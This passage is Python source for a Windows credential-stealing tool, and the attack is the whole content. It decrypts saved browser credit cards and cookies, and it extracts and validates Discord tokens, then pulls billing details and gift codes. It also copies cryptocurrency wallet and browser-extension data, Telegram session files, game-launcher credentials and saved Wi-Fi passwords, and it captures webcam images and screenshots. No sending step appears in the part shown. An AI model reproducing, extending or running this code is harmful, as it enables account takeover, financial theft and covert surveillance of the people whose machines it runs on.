    def GetCreditCards(browser_path: str, key: bytes, output_dir: str) -> int:
        count = 0
        db_path = os.path.join(browser_path, 'Web Data')
        tmp_path = Browsers._copy_db_to_temp(db_path)
        if tmp_path is None:
            return 0
        try:
            conn = sqlite3.connect(tmp_path)
            conn.text_factory = lambda b: b.decode('utf-8', errors='replace')
            cursor = conn.cursor()
            try:
                cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')
            except sqlite3.OperationalError:
                conn.close()
                return 0
            results = []
            for row in cursor.fetchall():
                name_on_card = row[0] or 'Unknown'
                exp_month = row[1]
                exp_year = row[2]
                card_encrypted = row[3]
                card_number = Browsers.DecryptValue(card_encrypted, key)
                if not card_number:
                    continue
                results.append(f'Name: {name_on_card}\nNumber: {card_number}\nExpires: {exp_month:02d}/{exp_year}\n')
                count += 1
            conn.close()
            if results:
                os.makedirs(output_dir, exist_ok=True)
                with open(os.path.join(output_dir, 'credit_cards.txt'), 'a', encoding='utf-8') as f:
                    f.write('\n'.join(results) + '\n')
        except Exception as exc:
            Browsers._logger.error(f'GetCreditCards error: {exc}')
        finally:
            try:
                os.remove(tmp_path)
            except Exception:
                pass
        return count

    @staticmethod
    def GetProfiles(browser_path: str) -> list[str]:
        profiles = []
        if not os.path.isdir(browser_path):
            return profiles
        for item in os.listdir(browser_path):
            if item == 'Default' or item.startswith('Profile '):
                full_path = os.path.join(browser_path, item)
                if os.path.isdir(full_path):
                    profiles.append(full_path)
        if not profiles and os.path.isfile(os.path.join(browser_path, 'Login Data')):
            profiles.append(browser_path)
        return profiles

    @staticmethod
    def run(output_dir: str) -> None:
        browsers_dir = os.path.join(output_dir, 'Browsers')
        for browser_name, browser_path in Browsers.BROWSER_PATHS.items():
            if not os.path.isdir(browser_path):
                continue
            Browsers._logger.debug(f'Processing {browser_name} at {browser_path}')
            key = Browsers.GetEncryptionKey(browser_path)
            if key is None:
                Browsers._logger.debug(f'No key for {browser_name}, skipping encrypted data')
            profiles = Browsers.GetProfiles(browser_path)
            if not profiles:
                Browsers._logger.debug(f'No profiles found for {browser_name}')
                continue
            for profile_path in profiles:
                profile_name = os.path.basename(profile_path)
                profile_output = os.path.join(browsers_dir, browser_name, profile_name)
                total = 0
                if Settings.CapturePasswords and key:
                    n = Browsers.GetPasswords(profile_path, key, profile_output)
                    Browsers._logger.debug(f'{browser_name}/{profile_name}: {n} passwords')
                    total += n
                if Settings.CaptureCookies and key:
                    n = Browsers.GetCookies(profile_path, key, profile_output)
                    Browsers._logger.debug(f'{browser_name}/{profile_name}: {n} cookies')
                    total += n
                if Settings.CaptureHistory:
                    n = Browsers.GetHistory(profile_path, profile_output)
                    Browsers._logger.debug(f'{browser_name}/{profile_name}: {n} history entries')
                    total += n
                if Settings.CaptureAutofills:
                    n = Browsers.GetAutofills(profile_path, profile_output)
                    Browsers._logger.debug(f'{browser_name}/{profile_name}: {n} autofills')
                    total += n
                if Settings.CaptureCreditCards and key:
                    n = Browsers.GetCreditCards(profile_path, key, profile_output)
                    Browsers._logger.debug(f'{browser_name}/{profile_name}: {n} credit cards')
                    total += n
                if total > 0:
                    Browsers._logger.debug(f'{browser_name}/{profile_name}: {total} total items collected')
try:
    from Crypto.Cipher import AES
except ImportError:
    from Cryptodome.Cipher import AES
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Discord:
    ROAMING = os.getenv('APPDATA', '')
    LOCALAPPDATA = os.getenv('LOCALAPPDATA', '')
    REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
    REGEX_ENC = 'dQw4w9WgXcQ:[^\\s]*'
    TOKEN_PATHS = {'Discord': os.path.join(ROAMING, 'discord'), 'Discord Canary': os.path.join(ROAMING, 'discordcanary'), 'Discord PTB': os.path.join(ROAMING, 'discordptb'), 'Lightcord': os.path.join(ROAMING, 'Lightcord'), 'Opera': os.path.join(ROAMING, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'), 'Chrome': os.path.join(LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), 'Edge': os.path.join(LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), 'Brave': os.path.join(LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Vivaldi': os.path.join(LOCALAPPDATA, 'Vivaldi', 'User Data'), 'Yandex': os.path.join(LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data')}
    DISCORD_CLIENTS = {'Discord', 'Discord Canary', 'Discord PTB', 'Lightcord'}
    _log = logging.getLogger('Discord')

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]

    @staticmethod
    def GetHeaders(token: str | None=None) -> dict:
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'}
        if token:
            headers['Authorization'] = token
        return headers

    @classmethod
    def _dpapi_decrypt(cls, encrypted: bytes) -> bytes:
        blob_in = cls.DATA_BLOB()
        blob_in.cbData = len(encrypted)
        blob_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted, len(encrypted)), ctypes.POINTER(ctypes.c_char))
        blob_out = cls.DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
            data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return data
        return b''

    @classmethod
    def _get_master_key(cls, path: str) -> bytes | None:
        local_state_path = os.path.join(path, 'Local State')
        if not os.path.isfile(local_state_path):
            return None
        try:
            with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
            encrypted_key = base64.b64decode(encrypted_key_b64)
            encrypted_key = encrypted_key[5:]
            master_key = cls._dpapi_decrypt(encrypted_key)
            return master_key if master_key else None
        except Exception as e:
            cls._log.debug(f'Failed to get master key from {path}: {e}')
            return None

    @classmethod
    def _decrypt_token(cls, encrypted_token: str, master_key: bytes) -> str | None:
        try:
            token_bytes = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
            iv = token_bytes[3:15]
            payload = token_bytes[15:-16]
            tag = token_bytes[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            return decrypted.decode('utf-8', errors='ignore')
        except Exception as e:
            cls._log.debug(f'Token decrypt failed: {e}')
            return None

    @classmethod
    def SafeStorageSteal(cls, path: str) -> list[str]:
        tokens: list[str] = []
        master_key = cls._get_master_key(path)
        if not master_key:
            return tokens
        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
        if not os.path.isdir(leveldb_path):
            return tokens
        for filename in os.listdir(leveldb_path):
            if not filename.endswith(('.log', '.ldb')):
                continue
            filepath = os.path.join(leveldb_path, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                for match in re.findall(cls.REGEX_ENC, content):
                    decrypted = cls._decrypt_token(match, master_key)
                    if decrypted and decrypted not in tokens:
                        tokens.append(decrypted)
            except Exception:
                continue
        return tokens

    @classmethod
    def SimpleSteal(cls, path: str) -> list[str]:
        tokens: list[str] = []
        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
        if not os.path.isdir(leveldb_path):
            return tokens
        for filename in os.listdir(leveldb_path):
            if not filename.endswith(('.log', '.ldb')):
                continue
            filepath = os.path.join(leveldb_path, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                for match in re.findall(cls.REGEX, content):
                    if match not in tokens:
                        tokens.append(match)
            except Exception:
                continue
        return tokens

    @classmethod
    def FireFoxSteal(cls, path: str) -> list[str]:
        tokens: list[str] = []
        if not os.path.isdir(path):
            return tokens
        for root, dirs, files in os.walk(path):
            for fname in files:
                if fname.endswith(('.sqlite', '.json', '.log', '.ldb', '.js')):
                    fpath = os.path.join(root, fname)
                    try:
                        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        for match in re.findall(cls.REGEX, content):
                            if match not in tokens:
                                tokens.append(match)
                    except Exception:
                        continue
        return tokens

    @classmethod
    def _validate_token(cls, token: str) -> dict | None:
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        try:
            resp = http.request('GET', 'https://discord.com/api/v9/users/@me', headers=cls.GetHeaders(token), timeout=10.0)
            if resp.status != 200:
                return None
            data = json.loads(resp.data.decode('utf-8'))
            return data
        except Exception as e:
            cls._log.debug(f'Token validation failed: {e}')
            return None

    @classmethod
    def _fetch_billing(cls, token: str) -> list[str]:
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        methods = []
        try:
            resp = http.request('GET', 'https://discord.com/api/v9/users/@me/billing/payment-sources', headers=cls.GetHeaders(token), timeout=10.0)
            if resp.status == 200:
                sources = json.loads(resp.data.decode('utf-8'))
                for src in sources:
                    match src.get('type'):
                        case 1:
                            methods.append(f"Credit Card (*{src.get('last_4', '????')})")
                        case 2:
                            methods.append(f"PayPal ({src.get('email', 'unknown')})")
                        case _:
                            methods.append(f"Unknown ({src.get('type', '?')})")
        except Exception:
            pass
        return methods

    @classmethod
    def _fetch_gift_codes(cls, token: str) -> list[str]:
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        codes = []
        try:
            resp = http.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-US', headers=cls.GetHeaders(token), timeout=10.0)
            if resp.status == 200:
                gifts = json.loads(resp.data.decode('utf-8'))
                for gift in gifts:
                    code = gift.get('code', '')
                    if code:
                        codes.append(f'https://discord.com/gifts/{code}')
        except Exception:
            pass
        return codes

    @classmethod
    def GetTokens(cls) -> list[dict]:
        collected: list[dict] = []
        seen_tokens: set[str] = set()
        for name, path in cls.TOKEN_PATHS.items():
            if not os.path.isdir(path):
                continue
            raw_tokens: list[str] = []
            if name in cls.DISCORD_CLIENTS:
                raw_tokens.extend(cls.SafeStorageSteal(path))
                raw_tokens.extend(cls.SimpleSteal(path))
            else:
                for item in os.listdir(path):
                    profile_path = os.path.join(path, item)
                    if os.path.isdir(profile_path):
                        ldb = os.path.join(profile_path, 'Local Storage', 'leveldb')
                        if os.path.isdir(ldb):
                            master_key = cls._get_master_key(path)
                            if master_key:
                                for fname in os.listdir(ldb):
                                    if fname.endswith(('.log', '.ldb')):
                                        fpath = os.path.join(ldb, fname)
                                        try:
                                            with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                                                content = f.read()
                                            for match in re.findall(cls.REGEX_ENC, content):
                                                dec = cls._decrypt_token(match, master_key)
                                                if dec and dec not in raw_tokens:
                                                    raw_tokens.append(dec)
                                            for match in re.findall(cls.REGEX, content):
                                                if match not in raw_tokens:
                                                    raw_tokens.append(match)
                                        except Exception:
                                            continue
            firefox_path = os.path.join(cls.ROAMING, 'Mozilla', 'Firefox', 'Profiles')
            if name == 'Discord' and os.path.isdir(firefox_path):
                raw_tokens.extend(cls.FireFoxSteal(firefox_path))
            for token in raw_tokens:
                if token in seen_tokens:
                    continue
                seen_tokens.add(token)
                user_data = cls._validate_token(token)
                if not user_data:
                    continue
                nitro_types = {0: 'None', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                premium = user_data.get('premium_type', 0)
                billing = cls._fetch_billing(token)
                gift_codes = cls._fetch_gift_codes(token)
                entry = {'source': name, 'token': token, 'username': f"{user_data.get('username', 'N/A')}", 'display_name': user_data.get('global_name', 'N/A'), 'id': user_data.get('id', 'N/A'), 'email': user_data.get('email', 'N/A'), 'phone': user_data.get('phone', 'N/A'), 'mfa_enabled': user_data.get('mfa_enabled', False), 'nitro': nitro_types.get(premium, 'Unknown'), 'billing': billing, 'gift_codes': gift_codes}
                collected.append(entry)
                cls._log.info(f"Valid token from {name}: {user_data.get('username', '?')}")
        return collected

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'Discord')
        os.makedirs(out, exist_ok=True)
        tokens = cls.GetTokens()
        if not tokens:
            cls._log.info('No valid Discord tokens found')
            return
        lines: list[str] = []
        for t in tokens:
            lines.append(f"Source: {t['source']}")
            lines.append(f"Token: {t['token']}")
            lines.append(f"Username: {t['username']}")
            lines.append(f"Display Name: {t['display_name']}")
            lines.append(f"ID: {t['id']}")
            lines.append(f"Email: {t['email']}")
            lines.append(f"Phone: {t['phone']}")
            lines.append(f"MFA: {t['mfa_enabled']}")
            lines.append(f"Nitro: {t['nitro']}")
            lines.append(f"Billing: {(', '.join(t['billing']) if t['billing'] else 'None')}")
            lines.append(f"Gift Codes: {(', '.join(t['gift_codes']) if t['gift_codes'] else 'None')}")
            lines.append('=' * 60)
        with open(os.path.join(out, 'tokens.txt'), 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines))
        cls._log.info(f'Saved {len(tokens)} token(s) to {out}')

class Wallets:
    WALLET_PATHS = {'Exodus': os.path.join(os.getenv('APPDATA', ''), 'Exodus', 'exodus.wallet'), 'Atomic': os.path.join(os.getenv('APPDATA', ''), 'atomic', 'Local Storage', 'leveldb'), 'Electrum': os.path.join(os.getenv('APPDATA', ''), 'Electrum', 'wallets'), 'Coinomi': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Coinomi', 'Coinomi', 'wallets'), 'Guarda': os.path.join(os.getenv('APPDATA', ''), 'Guarda', 'Local Storage', 'leveldb'), 'Zcash': os.path.join(os.getenv('APPDATA', ''), 'Zcash'), 'Armory': os.path.join(os.getenv('APPDATA', ''), 'Armory'), 'Bytecoin': os.path.join(os.getenv('APPDATA', ''), 'bytecoin'), 'Jaxx': os.path.join(os.getenv('APPDATA', ''), 'com.liberty.jaxx', 'IndexedDB'), 'Ethereum': os.path.join(os.getenv('APPDATA', ''), 'Ethereum', 'keystore')}
    _log = logging.getLogger('Wallets')

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'Wallets')
        found_any = False
        for name, src_path in cls.WALLET_PATHS.items():
            if not os.path.exists(src_path):
                continue
            dst_path = os.path.join(out, name)
            os.makedirs(dst_path, exist_ok=True)
            found_any = True
            try:
                if os.path.isdir(src_path):
                    for root, dirs, files in os.walk(src_path):
                        rel = os.path.relpath(root, src_path)
                        dst_sub = os.path.join(dst_path, rel)
                        os.makedirs(dst_sub, exist_ok=True)
                        for fname in files:
                            src_file = os.path.join(root, fname)
                            dst_file = os.path.join(dst_sub, fname)
                            try:
                                file_size = os.path.getsize(src_file)
                                if file_size > 10 * 1024 * 1024:
                                    continue
                                shutil.copy2(src_file, dst_file)
                            except Exception as e:
                                cls._log.debug(f'Failed to copy {src_file}: {e}')
                elif os.path.isfile(src_path):
                    shutil.copy2(src_path, os.path.join(dst_path, os.path.basename(src_path)))
            except Exception as e:
                cls._log.debug(f'Failed to copy wallet {name}: {e}')
        browser_wallets = {'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn', 'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa', 'TronLink': 'ibnejdfjmmkpcnlpebklmnkoeoihofec', 'Ronin': 'fnjhmkhhmkbjkkabndcnnogagogbneec', 'Binance': 'fhbohimaelbohpjbbldcngcnapndodjp'}
        chrome_ext_base = os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings')
        if os.path.isdir(chrome_ext_base):
            for wallet_name, ext_id in browser_wallets.items():
                ext_path = os.path.join(chrome_ext_base, ext_id)
                if os.path.isdir(ext_path):
                    dst_ext = os.path.join(out, f'Extension_{wallet_name}')
                    try:
                        shutil.copytree(ext_path, dst_ext, dirs_exist_ok=True)
                        found_any = True
                        cls._log.info(f'Copied {wallet_name} extension data')
                    except Exception as e:
                        cls._log.debug(f'Failed to copy extension {wallet_name}: {e}')
        if found_any:
            cls._log.info(f'Wallet data saved to {out}')
        else:
            cls._log.info('No wallets found')

class Telegram:
    TDATA_PATH = os.path.join(os.getenv('APPDATA', ''), 'Telegram Desktop', 'tdata')
    MAX_FILE_SIZE = 5 * 1024 * 1024
    KEY_FILES = {'key_datas', 'usertag', 'settings', 'settingss'}
    HEX_PATTERN = re.compile('^[A-Fa-f0-9]{16}$')
    SKIP_DIRS = {'user_data', 'emoji', 'tdummy', 'dumps', 'temp', 'working'}
    _log = logging.getLogger('Telegram')

    @classmethod
    def _should_copy_entry(cls, name: str) -> bool:
        lower = name.lower()
        if lower in cls.KEY_FILES:
            return True
        if lower.startswith('map'):
            return True
        if lower.startswith('configs'):
            return True
        if cls.HEX_PATTERN.match(name):
            return True
        if lower == 'key_datas':
            return True
        if lower.endswith('s') and cls.HEX_PATTERN.match(name[:-1]):
            return True
        return False

    @classmethod
    def run(cls, output_dir: str) -> None:
        tdata = cls.TDATA_PATH
        if not os.path.isdir(tdata):
            cls._log.info('Telegram tdata not found')
            return
        out = os.path.join(output_dir, 'Telegram', 'tdata')
        os.makedirs(out, exist_ok=True)
        copied_count = 0
        for entry in os.listdir(tdata):
            entry_path = os.path.join(tdata, entry)
            entry_lower = entry.lower()
            if entry_lower in cls.SKIP_DIRS:
                continue
            if not cls._should_copy_entry(entry):
                continue
            dst_entry = os.path.join(out, entry)
            try:
                if os.path.isfile(entry_path):
                    file_size = os.path.getsize(entry_path)
                    if file_size <= cls.MAX_FILE_SIZE:
                        shutil.copy2(entry_path, dst_entry)
                        copied_count += 1
                elif os.path.isdir(entry_path):
                    os.makedirs(dst_entry, exist_ok=True)
                    for root, dirs, files in os.walk(entry_path):
                        dirs[:] = [d for d in dirs if d.lower() not in ('cache', 'media_cache', 'stickers', 'user_data')]
                        rel = os.path.relpath(root, entry_path)
                        dst_sub = os.path.join(dst_entry, rel)
                        os.makedirs(dst_sub, exist_ok=True)
                        for fname in files:
                            src_file = os.path.join(root, fname)
                            try:
                                fsize = os.path.getsize(src_file)
                                if fsize <= cls.MAX_FILE_SIZE:
                                    shutil.copy2(src_file, os.path.join(dst_sub, fname))
                                    copied_count += 1
                            except Exception as e:
                                cls._log.debug(f'Failed to copy {src_file}: {e}')
            except Exception as e:
                cls._log.debug(f'Failed to process {entry}: {e}')
        if copied_count > 0:
            cls._log.info(f'Copied {copied_count} Telegram files to {out}')
        else:
            cls._log.info('No Telegram session data copied')

class Wifi:
    _log = logging.getLogger('Wifi')

    @classmethod
    def _get_profiles(cls) -> list[str]:
        profiles: list[str] = []
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW)
            for line in result.stdout.splitlines():
                match = re.search('All User Profile\\s*:\\s*(.+)', line)
                if not match:
                    match = re.search('Profil \\"Tous les utilisateurs\\"\\s*:\\s*(.+)', line)
                if match:
                    name = match.group(1).strip()
                    if name:
                        profiles.append(name)
        except Exception as e:
            cls._log.debug(f'Failed to list profiles: {e}')
        return profiles

    @classmethod
    def _get_password(cls, profile: str) -> str | None:
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear'], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
            for line in result.stdout.splitlines():
                match = re.search('Key Content\\s*:\\s*(.+)', line)
                if not match:
                    match = re.search('Contenu de la cl.\\s*:\\s*(.+)', line)
                if match:
                    return match.group(1).strip()
        except Exception as e:
            cls._log.debug(f'Failed to get password for {profile}: {e}')
        return None

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'Wifi')
        os.makedirs(out, exist_ok=True)
        profiles = cls._get_profiles()
        if not profiles:
            cls._log.info('No WiFi profiles found')
            return
        lines: list[str] = []
        for profile in profiles:
            password = cls._get_password(profile)
            if password:
                lines.append(f'SSID: {profile} | Password: {password}')
            else:
                lines.append(f'SSID: {profile} | Password: <not stored / open network>')
        output_file = os.path.join(out, 'wifi_passwords.txt')
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines))
        cls._log.info(f'Saved {len(lines)} WiFi profile(s) to {output_file}')

class Games:
    ROAMING = os.getenv('APPDATA', '')
    LOCALAPPDATA = os.getenv('LOCALAPPDATA', '')
    _log = logging.getLogger('Games')

    @classmethod
    def _steal_minecraft(cls, out_dir: str) -> None:
        mc_dir = os.path.join(cls.ROAMING, '.minecraft')
        if not os.path.isdir(mc_dir):
            return
        dst = os.path.join(out_dir, 'Minecraft')
        os.makedirs(dst, exist_ok=True)
        targets = ['launcher_accounts.json', 'launcher_profiles.json', 'launcher_accounts_microsoft_store.json']
        for fname in targets:
            src = os.path.join(mc_dir, fname)
            if os.path.isfile(src):
                try:
                    shutil.copy2(src, os.path.join(dst, fname))
                    cls._log.info(f'Copied Minecraft {fname}')
                except Exception as e:
                    cls._log.debug(f'Failed to copy {fname}: {e}')
        log_file = os.path.join(mc_dir, 'launcher_log.txt')
        if os.path.isfile(log_file):
            try:
                fsize = os.path.getsize(log_file)
                if fsize <= 5 * 1024 * 1024:
                    shutil.copy2(log_file, os.path.join(dst, 'launcher_log.txt'))
            except Exception:
                pass

    @classmethod
    def _steal_riot(cls, out_dir: str) -> None:
        riot_path = os.path.join(cls.LOCALAPPDATA, 'Riot Games', 'Riot Client', 'Data')
        if not os.path.isdir(riot_path):
            return
        dst = os.path.join(out_dir, 'RiotGames')
        os.makedirs(dst, exist_ok=True)
        targets = ['RiotGamesPrivateSettings.yaml', 'RiotClientPrivateSettings.yaml']
        for fname in targets:
            src = os.path.join(riot_path, fname)
            if os.path.isfile(src):
                try:
                    shutil.copy2(src, os.path.join(dst, fname))
                    cls._log.info(f'Copied Riot {fname}')
                except Exception as e:
                    cls._log.debug(f'Failed to copy {fname}: {e}')

    @classmethod
    def _steal_epic(cls, out_dir: str) -> None:
        epic_base = os.path.join(cls.LOCALAPPDATA, 'EpicGamesLauncher', 'Saved')
        if not os.path.isdir(epic_base):
            return
        dst = os.path.join(out_dir, 'EpicGames')
        os.makedirs(dst, exist_ok=True)
        config_path = os.path.join(epic_base, 'Config', 'Windows', 'GameUserSettings.ini')
        if os.path.isfile(config_path):
            try:
                shutil.copy2(config_path, os.path.join(dst, 'GameUserSettings.ini'))
            except Exception:
                pass
        logs_dir = os.path.join(epic_base, 'Logs')
        if os.path.isdir(logs_dir):
            dst_logs = os.path.join(dst, 'Logs')
            os.makedirs(dst_logs, exist_ok=True)
            for fname in os.listdir(logs_dir):
                src = os.path.join(logs_dir, fname)
                if os.path.isfile(src) and os.path.getsize(src) <= 5 * 1024 * 1024:
                    try:
                        shutil.copy2(src, os.path.join(dst_logs, fname))
                    except Exception:
                        pass

    @classmethod
    def _steal_uplay(cls, out_dir: str) -> None:
        uplay_dir = os.path.join(cls.LOCALAPPDATA, 'Ubisoft Game Launcher')
        if not os.path.isdir(uplay_dir):
            return
        dst = os.path.join(out_dir, 'Uplay')
        os.makedirs(dst, exist_ok=True)
        for root, dirs, files in os.walk(uplay_dir):
            dirs[:] = [d for d in dirs if d.lower() not in ('logs', 'crashdumps', 'cache')]
            rel = os.path.relpath(root, uplay_dir)
            dst_sub = os.path.join(dst, rel)
            os.makedirs(dst_sub, exist_ok=True)
            for fname in files:
                src_file = os.path.join(root, fname)
                try:
                    fsize = os.path.getsize(src_file)
                    if fsize <= 5 * 1024 * 1024:
                        shutil.copy2(src_file, os.path.join(dst_sub, fname))
                except Exception:
                    continue

    @classmethod
    def _steal_steam(cls, out_dir: str) -> None:
        steam_path = None
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Valve\\Steam') as key:
                steam_path = winreg.QueryValueEx(key, 'SteamPath')[0]
        except Exception:
            pass
        if not steam_path or not os.path.isdir(steam_path):
            common = [os.path.join(os.environ.get('ProgramFiles(x86)', ''), 'Steam'), os.path.join(os.environ.get('ProgramFiles', ''), 'Steam'), 'C:\\Steam']
            for p in common:
                if os.path.isdir(p):
                    steam_path = p
                    break
        if not steam_path or not os.path.isdir(steam_path):
            return
        dst = os.path.join(out_dir, 'Steam')
        os.makedirs(dst, exist_ok=True)
        config_dir = os.path.join(steam_path, 'config')
        if os.path.isdir(config_dir):
            dst_config = os.path.join(dst, 'config')
            try:
                shutil.copytree(config_dir, dst_config, dirs_exist_ok=True)
                cls._log.info('Copied Steam config/')
            except Exception as e:
                cls._log.debug(f'Failed to copy Steam config: {e}')
        for fname in os.listdir(steam_path):
            if fname.startswith('ssfn') or fname == 'loginusers.vdf':
                src = os.path.join(steam_path, fname)
                if os.path.isfile(src):
                    try:
                        shutil.copy2(src, os.path.join(dst, fname))
                    except Exception:
                        pass

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'Games')
        os.makedirs(out, exist_ok=True)
        cls._steal_minecraft(out)
        cls._steal_riot(out)
        cls._steal_epic(out)
        cls._steal_uplay(out)
        cls._steal_steam(out)
        cls._log.info(f'Game credential collection complete -> {out}')

class Webcam:
    _log = logging.getLogger('Webcam')

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'Webcam')
        os.makedirs(out, exist_ok=True)
        output_path = os.path.join(out, 'webcam.png')
        try:
            import cv2
        except ImportError:
            cls._log.info('cv2 not available, skipping webcam capture')
            return
        cap = None
        try:
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if not cap.isOpened():
                cap.release()
                cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                cls._log.info('No webcam detected')
                return
            for _ in range(5):
                cap.read()
            ret, frame = cap.read()
            if ret and frame is not None:
                cv2.imwrite(output_path, frame)
                cls._log.info(f'Webcam image saved to {output_path}')
            else:
                cls._log.info('Failed to capture webcam frame')
        except Exception as e:
            cls._log.debug(f'Webcam capture error: {e}')
        finally:
            if cap is not None:
                try:
                    cap.release()
                except Exception:
                    pass

class Screenshot:
    _log = logging.getLogger('Screenshot')

    @classmethod
    def _capture_pil(cls, output_path: str) -> bool:
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab(all_screens=True)
            img.save(output_path, 'PNG')
            cls._log.info(f'Screenshot (PIL) saved to {output_path}')
            return True
        except Exception as e:
            cls._log.debug(f'PIL screenshot failed: {e}')
            return False

    @classmethod
    def _capture_ctypes(cls, output_path: str) -> bool:
        try:
            user32 = ctypes.windll.user32
            gdi32 = ctypes.windll.gdi32
            try:
                user32.SetProcessDPIAware()
            except Exception:
                pass
            width = user32.GetSystemMetrics(78)
            height = user32.GetSystemMetrics(79)
            left = user32.GetSystemMetrics(76)
            top = user32.GetSystemMetrics(77)
            if width == 0 or height == 0:
                width = user32.GetSystemMetrics(0)
                height = user32.GetSystemMetrics(1)
                left = 0
                top = 0
            hdc_screen = user32.GetDC(0)
            hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
            hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
            old_bmp = gdi32.SelectObject(hdc_mem, hbmp)
            SRCCOPY = 13369376
            gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, left, top, SRCCOPY)
            bmp_info_size = 40
            bmp_header_size = 14
            row_size = (width * 3 + 3) // 4 * 4
            pixel_data_size = row_size * height
            file_size = bmp_header_size + bmp_info_size + pixel_data_size
            bmi = struct.pack('<IiiHHIIiiII', bmp_info_size, width, -height, 1, 24, 0, pixel_data_size, 0, 0, 0, 0)
            pixel_buf = ctypes.create_string_buffer(pixel_data_size)

            class BITMAPINFOHEADER(ctypes.Structure):
                _fields_ = [('biSize', ctypes.wintypes.DWORD), ('biWidth', ctypes.c_long), ('biHeight', ctypes.c_long), ('biPlanes', ctypes.wintypes.WORD), ('biBitCount', ctypes.wintypes.WORD), ('biCompression', ctypes.wintypes.DWORD), ('biSizeImage', ctypes.wintypes.DWORD), ('biXPelsPerMeter', ctypes.c_long), ('biYPelsPerMeter', ctypes.c_long), ('biClrUsed', ctypes.wintypes.DWORD), ('biClrImportant', ctypes.wintypes.DWORD)]
            bmi_struct = BITMAPINFOHEADER()
            bmi_struct.biSize = bmp_info_size
            bmi_struct.biWidth = width
            bmi_struct.biHeight = -height
            bmi_struct.biPlanes = 1
            bmi_struct.biBitCount = 24
            bmi_struct.biCompression = 0
            bmi_struct.biSizeImage = pixel_data_size
            gdi32.GetDIBits(hdc_mem, hbmp, 0, height, pixel_buf, ctypes.byref(bmi_struct), 0)
            bmp_file_header = struct.pack('<2sIHHI', b'BM', file_size, 0, 0, bmp_header_size + bmp_info_size)
            bmp_path = output_path.replace('.png', '.bmp')
            with open(bmp_path, 'wb') as f:
                f.write(bmp_file_header)
                f.write(bmi)
                f.write(pixel_buf.raw)
            try:
                from PIL import Image
                img = Image.open(bmp_path)
                img.save(output_path, 'PNG')
                os.remove(bmp_path)
            except ImportError:
                if bmp_path != output_path:
                    os.rename(bmp_path, output_path.replace('.png', '.bmp'))
            gdi32.SelectObject(hdc_mem, old_bmp)
            gdi32.DeleteObject(hbmp)
            gdi32.DeleteDC(hdc_mem)
            user32.ReleaseDC(0, hdc_screen)
            cls._log.info(f'Screenshot (ctypes) saved')
            return True
        except Exception as e:
            cls._log.debug(f'ctypes screenshot failed: {e}')
            return False

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'Screenshot')
        os.makedirs(out, exist_ok=True)
        output_path = os.path.join(out, 'screenshot.png')
        if not cls._capture_pil(output_path):
            cls._capture_ctypes(output_path)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SystemInfo:
    _log = logging.getLogger('SystemInfo')
